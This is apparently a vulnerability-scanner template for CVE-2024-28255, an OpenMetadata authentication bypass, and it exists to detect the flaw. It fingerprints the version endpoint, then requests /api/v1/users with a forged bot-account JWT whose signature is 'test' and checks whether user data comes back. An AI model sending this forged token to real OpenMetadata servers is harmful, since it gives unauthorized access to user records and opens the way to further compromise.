id: CVE-2024-28255
name: "OpenMetadata Authentication Bypass"
severity: critical
description: "OpenMetadata contains an authentication bypass vulnerability caused by improper JWT token validation, allowing unauthenticated attackers to access any API endpoint and execute SpEL expressions for remote code execution."
reference: CWE-287
confidence: tentative
requests:
  - method: GET
    path: "/api/v1/system/version"
    matchers:
      - type: body
        words:
          - "version"
          - "revision"
      - type: status
        status: [200]
    condition: and
  - method: GET
    path: "/api/v1/users"
    headers:
      Authorization: "Bearer eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJvcGVuLW1ldGFkYXRhLm9yZyIsInN1YiI6ImluZ2VzdGlvbi1ib3QiLCJlbWFpbCI6ImluZ2VzdGlvbi1ib3RAb3Blbm1ldGFkYXRhLm9yZyIsImlzQm90Ijp0cnVlLCJ0b2tlblR5cGUiOiJCT1QifQ.test"
    matchers:
      - type: body
        words:
          - "data"
          - "paging"
      - type: status
        status: [200]
    condition: and
